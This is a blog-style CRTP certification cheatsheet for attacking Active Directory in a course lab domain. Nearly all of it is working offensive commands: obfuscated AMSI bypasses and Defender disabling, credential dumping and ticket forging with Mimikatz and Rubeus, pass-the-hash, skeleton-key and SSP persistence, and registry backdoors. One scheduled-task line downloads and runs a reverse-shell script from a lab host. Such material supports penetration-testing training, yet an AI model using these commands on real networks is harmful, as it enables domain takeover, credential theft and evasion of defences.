---
layout: post
title: CRTP Cheatsheet (Active Directory)
---

# Evading AMSI and AV

## AMSI Bypass

```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

I found it was useful to keep an alternative AMSI bypass such as:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

## Windows Defender
The following command requires administrative privileges.

Disable Defender Monitoring
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

# Enumeration
All of the following functions are part of PowerView (or PowerView Dev) unless otherwise specified.

## Domain Enumeration

```powershell
# Get current domain
Get-NetDomain

# Get object of another domain
Get-NetDomain -Domain moneycorp.local

# Get domain SID
Get-DomainSID

# Get domain policy
Get-DomainPolicy
(Get-DomainPolicy-domainmoneycorp.local)."system access"

# Get domain controllers
Get-NetDomainController
Get-NetDomainController -Domain moneycorp.local
```

## Users and Properties

```powershell
# Get a list of users in the current domain
Get-NetUser
Get-NetUser -Username student1

# Get list of all properties for users in the current domain
Get-UserProperty
Get-UserProperty -Properties pwdlastset

# Search for a particular string in a user's attributes
Find-UserField -Search FieldDescription -SearchTerm "built"
```

### User Hunting

The function `Find-LocalAdminAccess` queries the DC of the current or provided domain for a list of computers (`Get-NetComputer`) and then uses multi-threaded `Invoke-CheckLocalAdminAccess` on each machine. 

In my experience this is both slow and unreliable (variable results), so be careful.

```powershell
# Find all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

# Find local admins on all machines of the domain (needs administrator privs on non-dc machines).
Invoke-EnumerateLocalAdmin -Verbose
```

The function `Invoke-UserHunter` queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using `Get-NetGroupMember`, gets a list of computers (`Get-NetComputer`) and list sessions and logged on users (`Get-NetSession/Get-NetLoggedon`) from each machine.

Again in reality I found this command to be somewhat unreliable.

```powershell
# Find computers where a domain admin (or specified user/group) has sessions
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"

# To confirm admin access
Invoke-UserHunter -CheckAccess

# Find computers where a domain admin is logged-in, querying only high-traffic servers
Invoke-UserHunter -Stealth

# Wait for Administrator to access a machine
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```


## Computers

```powershell
# Get a list of computers in the current domain
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData
```

## Groups

```powershell
# Get all the groups in the current domain
Get-NetGroup
Get-NetGroup -Domain <targetdomain>
Get-NetGroup -FullData

# Get all groups containing the word "admin" in group name
Get-NetGroup *admin*

# Get all the members of the Domain Adminsgroup
Get-NetGroupMember -GroupName "Domain Admins" -Recurse

# Get the group membership for a user
Get-NetGroup -UserName "svcadmin"

# List all the local groups on a machine (needs administrator privs on non-DC machines)
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups

# Get members of all the local groups on a machine (needs administrator privs on non-DC machines)
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
```

## Logged on users

```powershell
# Get actively logged users on a computer (needs local admin rights on the target)
Get-NetLoggedon -ComputerName <servername>

# Get locally logged users on a computer (needs remote registry on the target -started by-default on server OS)
Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local

# Get the last logged user on a computer (needs administrative rights and remote registry on the target)
Get-LastLoggedOn -ComputerName <servername>
```

## Files and Shares

```powershell
# Find shares on hosts in current domain
Invoke-ShareFinder -Verbose

# Find sensitive files on computers in the domain
Invoke-FileFinder -Verbose

# Get all fileservers of the domain
Get-NetFileServer
```

## Group Policy
- Group Policy provides a centralised system to manage and configure Active Directory
- Security settings
- Registry-based policy settings
- Group policy preferences such as startup, shutdown, logon/logoff script settings
- Software installation
- GPO can be abused to privilege escalate or establish persistence

```powershell
# Get list of GPO in current domain
Get-NetGPO
Get-NetGPO -ComputerName wks1.dollarcorp.moneycorp.local

# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
Get-NetGPOGroup

# Get users which are in a local group of a machine using GPO
Find-GPOComputerAdmin -Computername wks1.dollarcorp.moneycorp.local

# Get machines where the given user is member of a specific group
Find-GPOLocation -UserName svcadmin -Verbose
```

## Organisational Units
```powershell
# Get OUs in a domain
Get-NetOU -FullData

# Get GPO applied on an OU. Read GPOnamefrom gplinkattribute from Get-NetOU
Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081}"
```

## Access Control List

```powershell
# Get the ACLs associated with the specified object
Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs

# Get the ACLs associated with the specified prefix to be used for search
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose

# Get the ACLs associated with the specified LDAP path to be used for search
Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose

# Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

# Get the ACLs associated with the specified path
Get-PathAcl-Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
```

## Domain Trust Mapping

```powershell
# Get a list of all domain trusts for the current domain
Get-NetDomainTrust
Get-NetDomainTrust -Domain us.dollarcorp.moneycorp.local
```

## Forest Mapping

```powershell
# Get details about the current forest
Get-NetForest -Forest eurocorp.local

# Get all domains in the current forest
Get-NetForestDomain -Forest eurocorp.local

# Get all global catalogs for the current forest
Get-NetForestCatalog -Forest eurocorp.local

# Map trusts of a forest
Get-NetForestTrust -Forest eurocorp.local
```

# Kerberoasting

Find user accounts used as Service accounts:
```powershell
# PowerView
Get-NetUser -SPN
```

Request a TGS
```powershell
# Standard PowerShell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

We can also do this PowerView
```powershell
Request-SPNTicket -SPN "MSSQLSvc/sqlsrv.blob.finance.corp" -Format Hashcat
```

Export all tickets using Mimikatz:
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

## AS-REP Roasting

If preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT.

Enumerating accounts with Kerberos Preauth disabled
```powershell
# Using PowerView
Get-DomainUser -PreauthNotRequired -Verbose
```

With sufficient rights (`GenericWrite` or `GenericAll`), Kerberos preauth can be forced disabled.
```powershell
# Enumerate the permissions for RDPUsers on ACLs using PowerView (dev)
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Force disable Kerberos Preauth
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose

# Check
Get-DomainUser -PreauthNotRequired | ?{$_.samaccountname -eq "Control650user"}
```

Request encrypted AS-REP for offline brute-force.

```powershell
Get-ASREPHash -UserName VPN1user -Verbose
```

To enumerate all users with Kerberos preauth disabled and request a
hash:

```powershell
Invoke-ASREPRoast -Verbose
```

## Set-SPN

With enough rights (`GenericAll`/`GenericWrite`), a target user's SPN can be set to anything, as long as it is unique in the domain.

We can then request a TGS without special privileges. 

Check if SPN is set on support650user
```powershell
Get-DomainUser -Identity support650user | select serviceprincipalname
```

Then set a fake SPN
```powershell
Set-DomainObject -Identity support650user -Set @{serviceprincipalname='dcorp/blob650'} -Verbose
```

Request TGT, export and crack.
```powershell
Add-Type -AssemblyName System.IdentityModel 

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "dcorp/blob650"
```

Can also use PowerView dev to request a ticket.
```powershell
Get-DomainUser -Identity support650user | Get-DomainSPNTicket | select -ExpandProperty Hash
```


# Kerberos Delegation

## Unconstrained Delegation

Find domain computers with unconstrained delegation enabled

```powershell
# Using PowerView
Get-NetComputer -UnConstrained

# Using AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

Once a server with Unconstrained Delegation enabled has been compromised, we can run the following Mimikatz command to check if any Domain Admin token is available.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

Then once a domain admin connects to a service on the server we can export the ticket and pass-the-ticket.

### Printer Bug
This is a feature of MS-RPRN which allows any domain user (Authenticated User) to force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.

We can force the a domain controller to connect to an application server by abusing the Printer bug.

We can capture the TGT of the DC Machine Account by using Rubeus on `dcorp-appsrv`:

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

And after that run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on the student VM:

```bash
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

The DA ticket can be exported as usual.

## Constrained Delegation

When enabled on a service account, Constrained Delegation allows access only to specified services on specified computers as a user.

A typical scenario where constrained delegation is used - a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorisation.

The delegation occurs not only for the specified service **but for any service running under the same account**. There is no validation for the SPN specified.

Enumerate users and computers with constrained delegation enabled:

```powershell
# Using PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Using AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

Note if the **domain computer is trusted to auth for delegation** we must use the RC4 for the machine hash of that computer itself, e.g. `STUDVM$`. If it is the service account with delegation enabled we can use the hash for the account as usual.

### Rubeus
To abuse Constrained Delegation using Rubeus, we can use the following command, which  requests a TGT and TGS in a single command:

```bash
# CIFS (File server) service
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt

ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

As mentioned we can abuse constrained delegation to gain access to other services e.g. by specifying `altservice`:
```bash
.\Rubeus.exe s4u /user:WKS1$ /rc4:e711fbebe5151b36d38aecb5bdafabb0 /impersonateuser:Administrator /msdsspn:"CIFS/appsrv.blob.finance.corp" /altservice:http,host,rpcss,wsman,ldap /ptt
```

# Lateral Movement

## PowerShell Remoting

Stateful PS remoting commands
```powershell
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local

# Load function (must be in memory in the local PowerShell session)
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess 
```

Stateless command execution over remote session:
```powershell
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-
mgmt.dollarcorp.moneycorp.local

Invoke-Command -ScriptBlock {sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )} -Session $sess

Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
```

File transfer to remote server:
```powershell
Copy-Item -ToSession $sess -Path C:\Users\Public\Invoke-Mimikatz.ps1 -Destination C:\Users\Public\Invoke-Mimikatz.ps1
```

Load a script into the session:
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess
```

## Pass the Hash

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

# Persistence 

## Golden Ticket

Golden Ticket is a late-stage attack which requires the hash of the `krbtgt` account, which means we need replication privileges or domain admin access.

A golden ticket is signed and encrypted by the hash of `krbtgt` account which makes it a valid TGT ticket. 

Since user account validation is not done by Domain Controller (KDC service) until the TGT is more than 20 minutes old, we can even use deleted/revoked accounts.

The `krbtgt` user hash could be used to impersonate **any user** with **any privileges** from even a non-domain machine.

```powershell
# Execute Mimikatz on DC as DA to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa/patch"' -Computername dcorp-dc

# On any machine, supply krbtgt hash to create a golden ticket
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"' 
```

### Command Explained
- `kerberos::golden` - Name of the module
- `/User:Administrator` - Username for which the TGT is generated
- `/domain:dollarcorp.moneycorp.local` - Domain FQDN
- `/sid:S-1-5-21-1874506631-3219952063-538504511` - Domain SID
- `/krbtgt:ff46a9d8bd66c6efd77603da26796f35` - NTLM(RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys.
- `/id:500 /groups:512` - Optional UserRID (default 500) and Group (default 513 512 520 518 519)
- `/ptt or /ticket` - Injects the ticket in current PowerShell process - no need to save the ticket on disk, or saves the ticket to a file for later use
- `/startoffset:0` - Optional when the ticketis available (default 0 -right now) in minutes. Use negative for a ticket available from past and a larger number for future.
- `/endin:600` - Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes
- `/renewmax:10080` - Optional ticket lifetime with renewal(default is 10 years) in minutes. The default AD setting is 7 days = 100800

To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges:

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt /all"'
```

Using the DCSync option needs no code execution (no need to run `Invoke-Mimikatz`) on the target DC. 

## Silver Ticket
A silver ticket is a valid Kerberos Ticket Granting Service TGS ticket that has been forged (the golden ticket is the TGT). It is encrypted and signed by the NTLM hash of the service account; whereas the golden ticket is signed by the hash of the `krbtgt`.  The Silver Ticket scope is limited to whatever service is targeted on a specific server.

The TGS is forged, so no associated TGT, meaning the DC is never contacted. Any event logs are on the targeted server.

Using the hash of the Domain Controller computer account, the following command provides access to shares on the DC.
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"' 
```
A similar command can be used for any other service on a machine, such as HOST, RPCSS, WSMAN, and more.

**Mimikatz Silver Ticket Command Reference**
- `kerberos::golden` Name of the module (there is no Silver module!)
- `/user:Administrator` - Username for which the TGT is generated
- `/domain` - the fully qualified domain name.
- `/sid:S-1-5-21-1874506631-3219952063-538504511` - the SID of the domain.
- `/target:dcorp-dc.dollarcorp.moneycorp.local` - Target server FQDN
- `/rc4:6f5b5acaf7433b3282ac22e21e62ff22` - NTLM (RC4) hash of the service account. Use /aes128 and /aes256 for using AES keys.
- `/groups:512` - group RIDs the user is a member of (the first is the primary group) default: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
- `/service:cifs` - the kerberos service running on the target server. This is the Service Principal Name class (or type) such as cifs, http, mssql.
- `/ticket` (optional) - provide a path and name for saving the Golden Ticket file to for later use.
- `/ptt` - as an alternate to `/ticket` - use this to immediately inject the forged ticket into memory for use.
- `/id:500` (optional) - user RID. Mimikatz default is 500 (the default Administrator account RID).
- `/startoffset:0` (optional) - the start offset when the ticket is available (generally set to -10 or 0 if this option is used). Mimikatz Default value is 0.
- `/endin:600` (optional) - ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
- `/renewmax:10080` (optional) - maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).

### Code execution using Silver Tickets

Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target:
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
```

Schedule and execute a task.
```bash
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "DBCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1/Public/Invoke-PowerShellTcpEx.ps1''')'"

schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "DBCheck"
```

## Skeleton Key

With DA privileges, it is possible to patch a Domain Controller (LSASS process) so that it allows access as any user with a single password.

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

The enables access any machine with a valid username using a password of `mimikatz`:
```powershell
# Default password is mimikatz
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
```

In case LSASS is running as a protected process, we can still use Skeleton Key but it needs the Mimikatz driver (`mimidriv.sys`) on disk of the target DC:
```bash
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

## Directory Services Restore Mode

The DSRM password (`SafeModePassword`) is required when a server is promoted to Domain Controller and it is rarely changed. 

Dump DSRM password (needs DA privileges):
```powershell
Invoke-Mimikatz-Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
```

After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
```powershell
# Change DSRM account logon behaviour
Enter-PSSession -Computername dcorp-dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Pass the hash
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

## Custom SSP
A Security Support Provider (SSP) is a DLL which provides methods for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are 
- NTLM
- Kerberos
- Wdigest
- CredSSP
Mimikatz provides a custom SSP - `mimilib.dll`. This SSP logs local logons, service account and machine account passwords in clear text on the target server.

To achieve this we can use two techniques:

i. Drop mimilib.dll to System32 and add it to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`:

```powershell
$packages=Get-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages' 
$packages+="mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

ii. Using mimikatz, inject into LSASS (Not stable with Server 2016)

```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```

From then on all local logons on the DC are logged to `C:\Windows\system32\kiwissp.log`.

## Security Descriptors 

It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users. 

Administrative privileges are required for modifications such as these.

### WMI

On local machine for student1:
```powershell
Set-RemoteWMI -UserName student1 -Verbose
```

On remote machine for student1 without explicit credentials:
```powershell
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

On remote machine with explicit credentials. Only `root\cimv2` and nested namespaces:
```powershell
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
```

On remote machine remove permissions:
```powershell
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -namespace 'root\cimv2'-Remove -Verbose
```

### PowerShell Remoting

On local machine for student1:
```powershell
Set-RemotePSRemoting -UserName student1-Verbose
```

On remote machine for student1 without credentials:
```powershell
Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Verbose
```

On remote machine, remove the permissions:
```powershell
Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Remove
```

### Remote Registry

Using DAMP, with admin privs on remote machine:
```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
```

As `student1`, retrieve machine account hash:
```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

Retrieve local account hash:
```powershell
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```

Retrieve domain cached credentials:
```powershell
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```

# Cross-Trust Privilege Escalation

## Using the domain trust key

Execute LSAdump on the Domain Controller of the child domain. Look for `[In]` trust key from child to parent.
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```

We also need the SID for Enterprise Admins group of the parent domain.
```powershell
Get-NetGroup -Domain moneycorp.local -Name "Enterprise Admins" | select objectsid
```

Forge an inter-realm trust ticket:
```powershell
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:c672f9494aaeefa352e65085c2ad7e19 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'
```

Request TGS and TGT with Rubeus:
```bash
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

ls \\mcorp-dc.moneycorp.local\c$
```

## Using krbtgt

We need the krbtgt hash for this.
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
```

The rest of the attack is as follows above.

## Trust Abuse - MSSQL Servers
SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
```powershell
# Discovery (SPN Scanning)
Get-SQLInstanceDomain

# Check accessibility
Get-SQLConnectionTestThreaded

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# Gather information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

### Database Links
A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.

In case of database links between SQL servers, it is possible to execute stored procedures.

Database links work even across forest trusts.

#### Searching Database Links
Look for links to remote servers
```powershell
Get-SQLServerLink -Instance dcorp-mssql -Verbose
# or
select * from master..sysservers
```

#### Enumerating Database Links
**Manually**
`openquery()` function can be used to run queries on a linked database
```sql
select * from openquery("dcorp-sql1",'select * from master..sysservers')
```

**PowerUpSQL**

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
```

Or Openquery queries can be chained to access nested links.
```sql
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
```

#### Executing Commands

- On the target server, either `xp_cmdshell` should be already enabled; or
- If `rpcout` is enabled (disabled by default), `xp_cmdshell` can be enabled using:

```sql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
```

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"
```

From the initial SQL server, OS commands can be executed using nested
link queries:

```sql
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```

# Mimikatz reference

Pass-the-Hash with sekurlsa
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

Standard credential harvesting (`sekurlsa::logonpasswords`):
```powershell
Invoke-Mimikatz -DumpCreds
```

Execute mimikatz on DC as DA to get hashes
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

Dump trust keys
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' 
```

Dump from credential vault
```powershell
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```

Execute DCSync via Mimikatz
```powershell
# Gets the hash of krbtgt
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

Skeleton Key attack
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

Inject tickets with Mimikatz
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\test\krbtgt_tkt.kirbi"'
```
